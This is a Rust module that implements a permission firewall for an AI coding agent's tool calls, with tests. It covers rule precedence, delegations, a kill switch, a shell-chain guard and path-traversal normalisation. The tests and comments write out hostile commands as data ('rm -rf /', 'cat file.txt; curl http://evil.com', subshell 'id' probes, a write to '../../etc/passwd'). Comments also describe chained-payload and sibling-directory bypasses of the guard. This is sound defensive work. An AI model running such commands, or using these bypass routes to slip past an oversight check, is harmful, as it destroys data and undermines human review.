use std::collections::HashMap;

use regex::Regex;

use crate::config::{Action, Conditions, FirewallConfig, Rule};
use crate::delegate::RuntimeDelegation;
use crate::models::EvaluationInput;

/// Priority level for a decision (affects notification sound).
#[derive(Debug, Clone, PartialEq)]
pub enum Priority {
    Low,
    Medium,
    High,
}

/// The result of evaluating a hook payload against the firewall rules.
#[derive(Debug)]
pub struct Decision {
    pub action: Action,
    pub reason: String,
    pub matched_rule: Option<String>,
    pub priority: Priority,
}

/// Pre-compile regex patterns from delegation conditions.
/// Returns a map keyed by delegation index → compiled Regex.
pub fn compile_delegation_patterns(delegations: &[RuntimeDelegation]) -> HashMap<usize, Regex> {
    let mut patterns = HashMap::new();
    for (i, d) in delegations.iter().enumerate() {
        if let Some(ref cond) = d.conditions {
            if let Some(ref pat) = cond.bash_pattern {
                if let Ok(re) = Regex::new(pat) {
                    patterns.insert(i, re);
                }
                // Invalid regex silently skipped — delegation won't match Bash conditions
            }
        }
    }
    patterns
}

/// Evaluate a hook payload against the firewall config, runtime delegations,
/// and ELO-calibrated overrides.
///
/// Precedence order:
/// 1. Blocked rules (non-overridable)
/// 2. Runtime delegations (human trust expansion + role-generated)
/// 3. Agent overrides: YAML (human) first, then ELO-calibrated
/// 4. Restricted rules
/// 5. Trust circle rules
/// 6. Defaults (fallback)
pub fn evaluate(
    config: &FirewallConfig,
    patterns: &crate::config::CompiledPatterns,
    delegations: &[RuntimeDelegation],
    payload: &EvaluationInput,
) -> Decision {
    evaluate_with_elo(config, patterns, delegations, payload, &HashMap::new(), &std::collections::HashSet::new())
}

/// Full evaluation including ELO-calibrated overrides and mission revocation checks.
pub fn evaluate_with_elo(
    config: &FirewallConfig,
    patterns: &crate::config::CompiledPatterns,
    delegations: &[RuntimeDelegation],
    payload: &EvaluationInput,
    elo_overrides: &HashMap<String, Vec<Rule>>,
    revoked_agents: &std::collections::HashSet<String>,
) -> Decision {
    // Compile ELO override regex patterns and merge with existing patterns.
    // ELO overrides loaded from JSON don't go through compile_config, so their
    // bash_pattern regex must be compiled here before check_rules can match them.
    let mut all_patterns = patterns.clone();
    for (agent_id, rules) in elo_overrides {
        let tier = format!("elo_override:{agent_id}");
        // Silently skip invalid regex — same safety contract as delegation patterns.
        // An invalid pattern means the rule won't match (safe fallback to ask).
        let _ = crate::config::compile_rules(rules, &tier, &mut all_patterns);
    }

    // 1. Blocked — first, non-overridable
    if let Some(decision) = check_rules(&config.blocked, payload, "blocked", &all_patterns) {
        return decision;
    }

    // 2. Runtime delegations (with conditions support)
    let delegation_patterns = compile_delegation_patterns(delegations);
    if let Some(decision) = check_delegations(delegations, payload, &delegation_patterns) {
        return decision;
    }

    // 3. Agent overrides — YAML (human) takes precedence over ELO
    if let Some(ref agent_id) = payload.agent_id {
        // 3a. YAML-defined overrides (human always wins)
        if let Some(rules) = config.agent_overrides.get(agent_id) {
            let tier = format!("agent_override:{agent_id}");
            if let Some(decision) = check_rules(rules, payload, &tier, &all_patterns) {
                return decision;
            }
        }
        // 3b. ELO-calibrated overrides
        if let Some(rules) = elo_overrides.get(agent_id) {
            let tier = format!("elo_override:{agent_id}");
            if let Some(decision) = check_rules(rules, payload, &tier, &all_patterns) {
                return decision;
            }
        }
    }

    // 4. Restricted
    if let Some(decision) = check_rules(&config.restricted, payload, "restricted", &all_patterns) {
        return decision;
    }

    // 4.5. H1: Shell chain guard — Bash commands containing chain operators (&&, ||, ;, $(...),
    // backtick) skip trust_circle auto-approve and fall through to defaults (ask).
    // This prevents the "safe prefix + chained payload" bypass:
    //   e.g. `echo foo && rm -rf /` would otherwise match trust_circle's echo rule.
    // Blocked/restricted rules still fire first (steps 1-4), delegations fire at step 2.
    // Plain pipes (|) are intentionally excluded — safe piped-command rules still apply.
    if payload.tool_name == "Bash" {
        if let Some(cmd) = payload.tool_input.get("command").and_then(|v| v.as_str()) {
            if contains_shell_chain(cmd) {
                return Decision {
                    action: config.defaults.action.clone(),
                    reason: "Bash command contains shell chain operators (&&, ||, ;, $(...)) — requires human review".to_string(),
                    matched_rule: Some("chain_guard".to_string()),
                    priority: Priority::Medium,
                };
            }
        }
    }

    // 4.8. Mission revocation kill switch
    // If agent's mission was deactivated, deny all tools. This overrides CC session rules
    // that were taught via PermissionRequest hooks before the mission was revoked.
    if let Some(ref agent_id) = payload.agent_id {
        if revoked_agents.contains(agent_id) {
            return Decision {
                action: Action::Block,
                reason: format!("Mission revoked for agent '{}' — permissions expired", agent_id),
                matched_rule: Some(format!("mission_revoked:{}", agent_id)),
                priority: Priority::High,
            };
        }
    }

    // 5. Trust circle
    if let Some(decision) = check_rules(&config.trust_circle, payload, "trust_circle", &all_patterns) {
        return decision;
    }

    // 6. Defaults
    Decision {
        action: config.defaults.action.clone(),
        reason: "No matching rule — falling back to default".to_string(),
        matched_rule: Some("defaults".to_string()),
        priority: Priority::Medium,
    }
}

fn check_delegations(
    delegations: &[RuntimeDelegation],
    payload: &EvaluationInput,
    delegation_patterns: &HashMap<usize, Regex>,
) -> Option<Decision> {
    for (i, d) in delegations.iter().enumerate() {
        if d.tool != payload.tool_name {
            continue;
        }
        // If delegation specifies an agent_id, it must match
        if let Some(ref delegation_agent) = d.agent_id {
            if payload.agent_id.as_ref() != Some(delegation_agent) {
                continue;
            }
        }
        // If delegation specifies a session_id, it must match
        if let Some(ref delegation_session) = d.session_id {
            if &payload.session_id != delegation_session {
                continue;
            }
        }
        // If delegation has conditions, evaluate them
        if let Some(ref cond) = d.conditions {
            if !delegation_conditions_match(cond, payload, i, delegation_patterns) {
                continue;
            }
        }
        let source = d.source.as_deref().unwrap_or("human");
        return Some(Decision {
            action: d.action.clone(),
            reason: format!("Runtime delegation for tool '{}' (source: {})", d.tool, source),
            matched_rule: Some("runtime_delegation".to_string()),
            priority: Priority::Low,
        });
    }
    None
}

/// Evaluate delegation conditions against the payload.
fn delegation_conditions_match(
    cond: &crate::delegate::DelegationConditions,
    payload: &EvaluationInput,
    delegation_idx: usize,
    delegation_patterns: &HashMap<usize, Regex>,
) -> bool {
    // Check bash_pattern (only for Bash tool)
    if cond.bash_pattern.is_some() && payload.tool_name == "Bash" {
        let command = payload
            .tool_input
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        if let Some(re) = delegation_patterns.get(&delegation_idx) {
            if !re.is_match(command) {
                return false;
            }
        } else {
            return false; // pattern couldn't be compiled
        }
    }

    // Check path_within — use Path::starts_with for component-based comparison (H2).
    let path = extract_path(payload).map(|p| normalize_path(&p));
    if let Some(ref allowed_dirs) = cond.path_within {
        if let Some(ref p) = path {
            if !allowed_dirs.iter().any(|dir| std::path::Path::new(p).starts_with(dir)) {
                return false;
            }
        }
        if path.is_none() {
            return false;
        }
    }

    // Check path_not_match
    if let Some(ref blocked_patterns) = cond.path_not_match {
        if let Some(ref p) = path {
            for pattern in blocked_patterns {
                if glob_match(pattern, p) {
                    return false;
                }
            }
        }
    }

    true
}

fn check_rules(rules: &[Rule], payload: &EvaluationInput, tier: &str, patterns: &crate::config::CompiledPatterns) -> Option<Decision> {
    for (i, rule) in rules.iter().enumerate() {
        if !rule.tools.contains(&payload.tool_name) {
            continue;
        }
        let rule_key = format!("{tier}[{i}]");
        if let Some(ref conditions) = rule.conditions {
            if !conditions_match(conditions, payload, &rule_key, patterns) {
                continue;
            }
        }
        let priority = match rule.action {
            Action::Block => Priority::High,
            Action::Ask => Priority::Medium,
            Action::AutoApprove => Priority::Low,
        };
        return Some(Decision {
            action: rule.action.clone(),
            reason: rule
                .reason
                .clone()
                .unwrap_or_else(|| format!("Matched {tier} rule #{i}")),
            matched_rule: Some(format!("{tier}[{i}]")),
            priority,
        });
    }
    None
}

fn conditions_match(conditions: &Conditions, payload: &EvaluationInput, rule_key: &str, patterns: &crate::config::CompiledPatterns) -> bool {
    // Check bash_pattern against tool_input["command"] — only applies to Bash tool
    if let Some(ref _pattern) = conditions.bash_pattern {
        if payload.tool_name == "Bash" {
            let command = payload
                .tool_input
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if let Some(re) = patterns.get(rule_key) {
                if !re.is_match(command) {
                    return false;
                }
            } else {
                return false; // pattern was supposed to be compiled but wasn't found
            }
        }
        // For non-Bash tools, bash_pattern is not applicable — skip it
    }

    // Resolve the relevant path from tool_input, normalizing to prevent traversal
    let path = extract_path(payload).map(|p| normalize_path(&p));

    // Check path_within — use Path::starts_with for component-based comparison.
    // H2: String::starts_with("/project") would incorrectly match "/project-evil/file.rs".
    // Path::starts_with is component-aware and prevents this sibling-directory bypass.
    if let Some(ref allowed_dirs) = conditions.path_within {
        if let Some(ref p) = path {
            if !allowed_dirs.iter().any(|dir| std::path::Path::new(p).starts_with(dir)) {
                return false;
            }
        }
        // If no path found in input but path_within is required, no match
        if path.is_none() {
            return false;
        }
    }

    // Check path_not_match (glob-like exclusions)
    if let Some(ref blocked_patterns) = conditions.path_not_match {
        if let Some(ref p) = path {
            for pattern in blocked_patterns {
                if glob_match(pattern, p) {
                    return false;
                }
            }
        }
    }

    true
}

/// Normalize a path by resolving `.` and `..` segments without touching the filesystem.
/// This prevents path traversal bypasses like `/project/src/../../etc/passwd`.
fn normalize_path(path: &str) -> String {
    use std::path::{Component, PathBuf};
    let mut normalized = PathBuf::new();
    for component in std::path::Path::new(path).components() {
        match component {
            Component::ParentDir => {
                normalized.pop();
            }
            Component::CurDir => {}
            other => normalized.push(other),
        }
    }
    normalized.to_string_lossy().to_string()
}

/// Extract the relevant file path from tool_input based on tool type.
fn extract_path(payload: &EvaluationInput) -> Option<String> {
    match payload.tool_name.as_str() {
        "Read" | "Write" | "Edit" => payload
            .tool_input
            .get("file_path")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string()),
        "Glob" | "Grep" => payload
            .tool_input
            .get("path")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string()),
        "WebFetch" => payload
            .tool_input
            .get("url")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string()),
        _ => None,
    }
}

/// Detect shell chain operators in a Bash command.
///
/// Returns true if the command contains `&&`, `||`, `;`, `$(`, or a backtick.
/// Plain pipes (`|`) are intentionally excluded — single pipes are safe for
/// the piped-commands trust_circle rules (`cat file | grep foo`).
///
/// This check is conservative: it will produce false positives for operators
/// inside quoted strings (e.g. `echo "a;b"`), but false positives only result
/// in an extra human confirmation, never in a security bypass.
fn contains_shell_chain(cmd: &str) -> bool {
    cmd.contains("&&")
        || cmd.contains("||")
        || cmd.contains(';')
        || cmd.contains("$(")
        || cmd.contains('`')
}

/// Glob matching against the filename (last path component).
/// Supports: `*.ext` (extension match), `prefix*` (prefix match), `*contains*` (substring in filename).
fn glob_match(pattern: &str, value: &str) -> bool {
    let filename = std::path::Path::new(value)
        .file_name()
        .and_then(|f| f.to_str())
        .unwrap_or(value);

    if pattern.starts_with('*') && pattern.ends_with('*') && pattern.len() > 2 {
        let needle = &pattern[1..pattern.len() - 1];
        filename.contains(needle)
    } else if let Some(suffix) = pattern.strip_prefix('*') {
        filename.ends_with(suffix)
    } else if let Some(prefix) = pattern.strip_suffix('*') {
        filename.starts_with(prefix)
    } else {
        filename == pattern
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{load_config, Action};
    use crate::delegate::RuntimeDelegation;
    use chrono::{Duration, Utc};
    use serde_json::json;
    use std::path::Path;

    fn load_test_config_and_patterns() -> (FirewallConfig, crate::config::CompiledPatterns) {
        let config_path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../config/trust-firewall.yaml");
        let config = load_config(&config_path, "/Users/test/project").unwrap();
        let patterns = crate::config::compile_config(&config).unwrap();
        (config, patterns)
    }

    fn make_payload(tool: &str, input: serde_json::Value) -> EvaluationInput {
        EvaluationInput {
            session_id: "test-session".to_string(),
            tool_name: tool.to_string(),
            tool_input: input,
            tool_use_id: "tu_test".to_string(),
            agent_id: None,
            cwd: "/Users/test/project".to_string(),
        }
    }

    #[test]
    fn test_auto_approve_read() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Read", json!({"file_path": "/Users/test/project/src/main.rs"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove);
    }

    #[test]
    fn test_auto_approve_safe_bash() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "cat foo.txt"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove);
    }

    #[test]
    fn test_block_force_push() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "git push --force origin main"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_block_force_push_short_flag() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "git push -f origin main"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_block_reset_hard() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "git reset --hard HEAD~1"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_commit_message_with_force_not_blocked() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "git commit -m 'removed --force flag'"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_ne!(decision.action, Action::Block);
    }

    #[test]
    fn test_block_rm_rf() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "rm -rf /"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_restricted_destructive_bash() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "rm -r /tmp/somedir"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Ask);
    }

    #[test]
    fn test_path_within_project() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Write", json!({"file_path": "/Users/test/project/src/lib.rs"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove);
    }

    #[test]
    fn test_path_not_match_env() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Write", json!({"file_path": "/Users/test/project/.env"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        // .env matches path_not_match, so the trust_circle rule won't match -> falls to default (ask)
        assert_eq!(decision.action, Action::Ask);
    }

    #[test]
    fn test_delegation_overrides_restricted() {
        let (config, patterns) = load_test_config_and_patterns();
        let delegation = RuntimeDelegation {
            tool: "Bash".to_string(),
            agent_id: None,
            action: Action::AutoApprove,
            created_at: Utc::now(),
            expires_at: Some(Utc::now() + Duration::hours(4)),
            session_id: None,
            source: None,
            mission_id: None,
            conditions: None,
        };
        // A destructive bash command that would normally be "ask"
        let payload = make_payload("Bash", json!({"command": "rm -r /tmp/foo"}));
        let decision = evaluate(&config, &patterns, &[delegation], &payload);
        // Delegation can't override blocked, but "rm -r" (without "rm -rf /") is restricted, not blocked
        // Blocked check runs first and doesn't match "rm -r /tmp/foo"
        // Then delegation matches -> auto-approve
        assert_eq!(decision.action, Action::AutoApprove);
    }

    #[test]
    fn test_delegation_cannot_override_blocked() {
        let (config, patterns) = load_test_config_and_patterns();
        let delegation = RuntimeDelegation {
            tool: "Bash".to_string(),
            agent_id: None,
            action: Action::AutoApprove,
            created_at: Utc::now(),
            expires_at: Some(Utc::now() + Duration::hours(4)),
            session_id: None,
            source: None,
            mission_id: None,
            conditions: None,
        };
        let payload = make_payload("Bash", json!({"command": "git push --force origin main"}));
        let decision = evaluate(&config, &patterns, &[delegation], &payload);
        // Blocked fires first, delegation can't override
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_precedence_order() {
        let (config, patterns) = load_test_config_and_patterns();
        // A command that matches both blocked (--force) and restricted (rm)
        let payload = make_payload("Bash", json!({"command": "rm -rf /"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        // Blocked should win
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_default_fallback() {
        let (config, patterns) = load_test_config_and_patterns();
        // Unknown MCP tool
        let payload = make_payload("mcp__unknown__tool", json!({"arg": "value"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Ask);
        assert_eq!(decision.matched_rule, Some("defaults".to_string()));
    }

    #[test]
    fn test_glob_match_exact_extension() {
        assert!(glob_match("*.env", "/project/.env"));
        assert!(glob_match("*.env", "/project/local.env"));
        assert!(!glob_match("*.env", "/project/.env.production"));
        assert!(!glob_match("*.env", "/project/.env.backup"));
    }

    #[test]
    fn test_glob_match_contains() {
        assert!(glob_match("*credentials*", "/project/credentials.json"));
        assert!(glob_match("*credentials*", "/project/aws_credentials"));
        assert!(glob_match("*credentials*", "/project/my-credentials-file.txt"));
    }

    #[test]
    fn test_glob_match_exact_filename() {
        assert!(glob_match("*.key", "/project/server.key"));
        assert!(!glob_match("*.key", "/project/server.keystore"));
    }

    #[test]
    fn test_path_not_match_env_production() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Write",
            json!({"file_path": "/Users/test/project/.env.production"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove);
    }

    #[test]
    fn test_path_traversal_blocked() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Write",
            json!({"file_path": "/Users/test/project/src/../../etc/passwd"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Ask);
    }

    #[test]
    fn test_malformed_input() {
        let (config, patterns) = load_test_config_and_patterns();
        // Bash tool with no "command" field
        let payload = make_payload("Bash", json!({"wrong_field": "value"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        // bash_pattern won't match empty command -> falls through trust_circle
        // restricted bash_pattern also won't match -> falls to default
        assert_eq!(decision.action, Action::Ask);
    }

    #[test]
    fn test_delegation_session_id_filtering() {
        let (config, patterns) = load_test_config_and_patterns();

        // Delegation scoped to session "sess_A"
        let delegation = RuntimeDelegation {
            tool: "Bash".to_string(),
            agent_id: None,
            action: Action::AutoApprove,
            created_at: Utc::now(),
            expires_at: Some(Utc::now() + Duration::hours(4)),
            session_id: Some("sess_A".to_string()),
            source: None,
            mission_id: None,
            conditions: None,
        };

        // Payload from same session → should match
        let mut payload_a = make_payload("Bash", json!({"command": "rm -r /tmp/foo"}));
        payload_a.session_id = "sess_A".to_string();
        let decision = evaluate(&config, &patterns, &[delegation.clone()], &payload_a);
        assert_eq!(decision.action, Action::AutoApprove, "same session should match delegation");

        // Payload from different session → should NOT match
        let mut payload_b = make_payload("Bash", json!({"command": "rm -r /tmp/foo"}));
        payload_b.session_id = "sess_B".to_string();
        let decision = evaluate(&config, &patterns, &[delegation], &payload_b);
        assert_eq!(decision.action, Action::Ask, "different session should not match delegation");
    }

    #[test]
    fn test_delegation_without_session_id_matches_all() {
        let (config, patterns) = load_test_config_and_patterns();

        // Delegation without session_id → matches any session
        let delegation = RuntimeDelegation {
            tool: "Bash".to_string(),
            agent_id: None,
            action: Action::AutoApprove,
            created_at: Utc::now(),
            expires_at: Some(Utc::now() + Duration::hours(4)),
            session_id: None,
            source: None,
            mission_id: None,
            conditions: None,
        };

        let mut payload = make_payload("Bash", json!({"command": "rm -r /tmp/foo"}));
        payload.session_id = "any_session".to_string();
        let decision = evaluate(&config, &patterns, &[delegation], &payload);
        assert_eq!(decision.action, Action::AutoApprove, "no session_id delegation should match any session");
    }

    // ── H1: Shell chain guard tests ──────────────────────────────────────────

    #[test]
    fn test_chain_guard_blocks_and_chain() {
        // H1: "echo foo && rm -rf /" starts with safe "echo" prefix but contains &&
        // Previously this would match trust_circle's echo rule. Now it must ask.
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "echo foo && rm -rf /"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Ask, "chained command with && must not be auto-approved");
    }

    #[test]
    fn test_chain_guard_blocks_semicolon() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "cat file.txt; curl http://evil.com"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Ask, "semicolon-chained command must not be auto-approved");
    }

    #[test]
    fn test_chain_guard_blocks_subshell() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "echo $(id)"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Ask, "subshell $(...) must not be auto-approved");
    }

    #[test]
    fn test_chain_guard_blocks_backtick() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "echo `id`"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Ask, "backtick subshell must not be auto-approved");
    }

    #[test]
    fn test_chain_guard_allows_safe_pipe() {
        // H1 non-regression: plain pipes should still be auto-approved via piped-commands rule
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "cat file.txt | grep pattern"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove, "safe pipe must still be auto-approved");
    }

    #[test]
    fn test_chain_guard_allows_simple_safe_command() {
        // H1 non-regression: simple commands without chain operators are unaffected
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "cat file.txt"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove, "simple safe command must be auto-approved");
    }

    // ── H2: path_within component-based comparison tests ────────────────────

    #[test]
    fn test_path_within_sibling_dir_rejected() {
        // H2: "/Users/test/project-evil/file.rs" must NOT match path_within "/Users/test/project"
        // With String::starts_with it would match (string prefix). Path::starts_with rejects it.
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Write", json!({"file_path": "/Users/test/project-evil/src/lib.rs"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_ne!(decision.action, Action::AutoApprove, "sibling directory must not be auto-approved");
    }

    #[test]
    fn test_path_within_exact_project_allowed() {
        // H2 non-regression: exact project path still works
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Write", json!({"file_path": "/Users/test/project/src/lib.rs"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove, "exact project path must be auto-approved");
    }
}
